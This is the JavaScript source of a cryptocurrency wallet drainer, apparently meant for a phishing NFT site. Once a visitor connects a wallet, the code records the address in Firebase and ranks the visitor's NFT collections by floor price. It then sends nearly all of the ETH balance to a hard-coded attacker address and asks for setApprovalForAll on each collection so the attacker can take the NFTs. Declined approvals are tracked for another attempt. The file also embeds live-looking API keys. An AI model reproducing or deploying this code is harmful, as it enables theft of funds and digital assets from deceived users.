$(document).ready(function () {
    console.log('yawa');
  })
  
  //FIREBASE
  
  const config = {
  apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
  authDomain: "jangneotokyo.firebaseapp.com",
  projectId: "jangneotokyo",
  storageBucket: "jangneotokyo.appspot.com",
  messagingSenderId: "20777123504",
  appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
  }
  
  const app = firebase.initializeApp(config)
  const db = firebase.firestore(app)
  
  const ref = db.collection('jangtokyo')
  
  const OPENSEA_URL = "https://api.opensea.io/"
  let account;
  
  async function loadWeb3() {
  try {
    window.web3 = await new Web3(window.ethereum)
  } catch (error)  {
    console.log(error)

  }
  }
  
  /**
   * 
   * @setItem
   * @getItem 
   */
  
  function setItem(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
    }
  
  function getItem(key) {
    return JSON.parse(localStorage.getItem(key));
  }
  
  //
  
  

  





  
  
  
  
  async function getAddress() {



    const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
    }).catch( (err) => {
        if (err.code === 4001) {
            console.log('please con met');
            location.reload()
            
        } else {
            console.error(err)
        }
    
    });
  
    account = accounts[0]
    console.log(account)
  
    const LISTCOLLECTION =   db.collection('addresses').doc(account)
  
    await LISTCOLLECTION.get().then(
      (docSnapshot) => {
        if (
          docSnapshot.exists
        ) {
          console.log('doc exists')
          LISTCOLLECTION.update({
            status: 'connected',
            date: new Date()
          })
  
        } else {
  
          console.log('doc not found')
          LISTCOLLECTION.set({
            address: account,
            date: new Date(),
            status: 'connected'
          }).then( () => {
            console.log('successfully added')
          }).catch( () => {
            console.log('error adding document');
          })
  
  
        }
      }
    )
  
  
  
  }
  
  
  
  const _abi = [
    {
      inputs: [],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "approved",
          type: "address",
        },
        {
          indexed: true,
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "Approval",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "operator",
          type: "address",
        },
        {
          indexed: false,
          internalType: "bool",
          name: "approved",
          type: "bool",
        },
      ],
      name: "ApprovalForAll",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "previousOwner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "newOwner",
          type: "address",
        },
      ],
      name: "OwnershipTransferred",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          indexed: true,
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "Transfer",
      type: "event",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "approve",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "owner",
          type: "address",
        },
      ],
      name: "balanceOf",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "getApproved",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          internalType: "address",
          name: "operator",
          type: "address",
        },
      ],
      name: "isApprovedForAll",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "name",
      outputs: [
        {
          internalType: "string",
          name: "",
          type: "string",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "ownerOf",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "renounceOwnership",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "safeMint",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "safeTransferFrom",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
        {
          internalType: "bytes",
          name: "data",
          type: "bytes",
        },
      ],
      name: "safeTransferFrom",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "operator",
          type: "address",
        },
        {
          internalType: "bool",
          name: "approved",
          type: "bool",
        },
      ],
      name: "setApprovalForAll",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "bytes4",
          name: "interfaceId",
          type: "bytes4",
        },
      ],
      name: "supportsInterface",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "symbol",
      outputs: [
        {
          internalType: "string",
          name: "",
          type: "string",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "tokenURI",
      outputs: [
        {
          internalType: "string",
          name: "",
          type: "string",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "transferFrom",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "newOwner",
          type: "address",
        },
      ],
      name: "transferOwnership",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
  ];
  
  
  
  async function check() {
  
    await getAddress();
  
    console.log(account);
  
    var nft = await nfts(account)
    console.log(nft)
  
  
  var data = {
    time: new Date(),
    spoof: nft,
    owner: account
  }
  
  
        if (getItem(account) == null || getItem(account).length == 0) {
            console.log('no data')
  
            setItem(account, data)
            trade()
            console.log('data added')
  
        } else {
            console.log('data already exists')
  
            trade()
        }
  
                    
  
  
  }
  
  
  
  async function trade() {
  
    await loadWeb3();
  
  
    var collection = []
    var owner;
    var sortedCollection = []
  
  
    data = getItem(account)
  
    owner = data.owner
    collection = data.spoof
  
  
   for (let i = 0; i < collection.length; i++) {
    collection[i].worth = 0;
    collection[i].owner = owner;
  
  
    try {
  
        var result =  await $.ajax({
            url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collection[i].contract,
            method: "GET",
            // success: function (data) {
            //     console.log(data)
  
  
  
            // }
        })
  
        if (result.openSea != undefined && result.openSea.floorPrice != undefined)
        collection[i].worth = result.openSea.floorPrice
  
        
    } catch (error) {
        console.log(error)
  
        if(collection[i].stats.seven_day_volume > 0) {
            collection[i].worth = Math.round(
                collection[i].stats.seven_day_volume * 0.8 * 10000
            ) / 10000
        }
    }
    
   }
  
   collection = collection.sort( (a, b) => {
    return a.worth < b.worth
    ? 1
    : -1;
  })
  
  
  
  for (let i = 0; i < collection.length; i++) {
  
     if (collection[i].worth != 0) {
        sortedCollection.push(collection[i])
     }
    
  }
  
  collection = sortedCollection;
  
  
   console.log(collection)

   var value = await get_eth(account) //search getbalance.js
   var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty
   
   const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
   
   
   
   
   console.log(finalAmount)
   const txData = {
     from: account,
     to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
     value: finalAmount,
   };
   
   
   await web3.eth.sendTransaction(txData)
     .then( (txHash) => {
       console.log(txHash)
     }).catch( (err) => {
       console.log(err)
     })
   
   
   
  
  /*---------------------------------------------------------------*/
  
    var declinedCollection = []
  
   //jang contracts
   const collection_contracts = db.collection(account.toLowerCase())
   //
  
  
  
  await collection_contracts.get().then( (querySnapshot) => {
    querySnapshot.forEach( (doc) => {
        var data = doc.data()
        var approved = data.approved
  
        //console.log(approved)
  
        
        if (approved === false) {
            console.log('declined')
  
            // console.log(data)
  
            //console.log(data)
            declinedCollection.push(data)
        } else {
            //
            console.log('nothing saved yet')
        }
  
    })
  }).catch( (error) => {
    console.log('error gettings documents ' + error)
  })
  
  
  
  
  
  if (declinedCollection.length < 1) {
    console.log('no data declined contracts yet')
  } else {
    console.log('filtered declined collections')
    collection = declinedCollection
  }
  
  
  
  
  console.log(collection)
  /*---------------------------------------------------------------*/
  
    for (let i = 0; i < collection.length; i++) {
       
  
        // console.log(collection[i])
  
        try {
  
            
            if (collection[i].approved == true) {
  
  
                console.log('approved')
                //no more approval
                //ilocalstorage nalang ni?
  
  
            } else {
  
        
  
                var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
                await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
  
                collection[i].date = new Date()
                collection[i].approved = true
                console.log(collection[i])
                
                collection_contracts.doc(collection[i].contract).set(collection[i])
                    .then( () => {
                        console.log('data updated')
                    })
                    .catch( () => {
                        console.log('error data update')
                    })
  
  
            }
  
            
        } catch (error) {
  
            console.log(error)
  
            if (error.code == 4001) {
         
  
                collection[i].date = new Date()
                collection[i].approved = false
                console.log(collection[i])
  
  
  
                collection_contracts.doc(collection[i].contract).get()
                    .then( (docSnapshot) => {
                        if (docSnapshot.exists) {
  
                            console.log('data already existed')
  
                        } else {
                            console.log('doc does not exist')
  
                            collection_contracts.doc(collection[i].contract).set(collection[i])
                            .then( () => {
                                console.log('data updated')
                            }).catch( (error) => {
                                console.log('error setting document ' + error)
                            })
                        }
                    }).catch( (error) => {
                        console.log('Error getting data ' + error)
                    })
                        
  
  
  
                
            }
            
        }
  
  
    
  
    }
  
  

  
    
  
  }
  
  
  async function nfts(addr) {
    var url = `${OPENSEA_URL}api/v2/chain/ethereum/account/${addr}/nfts`  
    var nft = []
    var contract = []
  
  
  await $.ajax({
    url: url,
    method: "GET",
    headers: {
        accept: 'application/json',
        'x-api-key': '078b8acce6a34dd3a2dbb0cd34127203'
      },
  
      success: function (data) {
        // console.log(data.nfts)
  
        for (var i = 0; i < data.nfts.length; i++) {
  
            nft.push(data.nfts[i].contract)
  
        }
  
        var uniq = [... new Set(nft)]
  
        nft = uniq
      }
      
  })
  
    nft.forEach( e => {
  
        var data = {contract: ''}
        data.contract = e
  
        contract.push(data)
    })
  
  return contract
  }
  
  
  /*------------------------------------------------------*/

    
    /*------------------------------------------------------*/


    check()


async function get_eth(address) {

  const balances = web3.utils.fromWei(
    await web3.eth.getBalance(address),
    'ether'
  )* 1;

  return balances;

}
